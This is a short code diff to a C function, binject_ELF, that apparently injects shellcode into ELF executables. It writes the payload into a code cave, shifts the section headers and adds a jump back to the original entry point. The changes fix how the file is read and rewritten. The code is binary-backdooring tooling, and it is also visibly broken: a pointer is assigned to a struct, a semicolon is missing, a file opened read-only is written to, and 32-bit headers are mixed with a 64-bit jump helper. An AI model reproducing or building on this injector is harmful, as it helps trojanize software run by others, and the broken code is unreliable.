@@ -12,7 +12,10 @@ int binject_ELF(char *file,char *shellcode,int method)
   f=fopen(file,"r");
   fseek(f,0,SEEK_END);
  size=ftell(f);
+  fseek(f,0,SEEK_SET);
+	
   char *file_buffer = calloc(1,size);
+  fread(file_buffer,1,size,f);
   char *address=file_buffer;
   struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
   oryginal_entry=ehdr.e_entry;
@@ -109,6 +112,7 @@ address=file_buffer+ehdr->e_shoff;
 	ehdr.e_shoff += PAGE_SIZE;
 	  char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
 memcpy(file_buffer+x,shellcodefixed,sclen);
+  fseek(f,0,SEEK_SET);
   fwrite(file_buffer,1,size,f);
   free(shellcodefixed);
   free(file_buffer);
